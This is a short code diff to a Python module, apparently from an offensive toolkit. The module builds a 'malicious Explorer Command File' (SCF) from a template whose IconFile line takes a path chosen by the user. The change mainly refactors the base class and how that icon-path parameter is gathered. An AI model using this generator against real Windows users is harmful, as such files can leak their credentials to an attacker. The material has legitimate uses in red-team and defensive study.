@@ -2,7 +2,8 @@
 # encoding: utf-8
 
 import logging
-from modules.payload_builder import PayloadBuilder
+from modules.mp_generator import Generator
+from collections import OrderedDict
 
 SCF_TEMPLATE = \
 r"""
@@ -13,7 +14,7 @@ IconFile=<<<ICON_FILE>>>
 Command=ToggleDesktop
 """
 
-class SCFGenerator(PayloadBuilder):
+class SCFGenerator(Generator):
     """ Module used to generate malicious Explorer Command File"""
     
     def check(self):
@@ -22,11 +23,14 @@ class SCFGenerator(PayloadBuilder):
     
     def generate(self):
                 
-        logging.info(" [+] Generating %s file..." % self.outputFileType)        
+        logging.info(" [+] Generating %s file..." % self.outputFileType)
+        paramDict = OrderedDict([("iconFilePath",None)])      
+        self.fillInputParams(paramDict)
+        
         
         # Fill template
         scfContent = SCF_TEMPLATE
-        scfContent = scfContent.replace("<<<ICON_FILE>>>", self.mpSession.icon)
+        scfContent = scfContent.replace("<<<ICON_FILE>>>", paramDict["iconFilePath"])
              
         # Write in new SCF file
         f = open(self.outputFilePath, 'w')
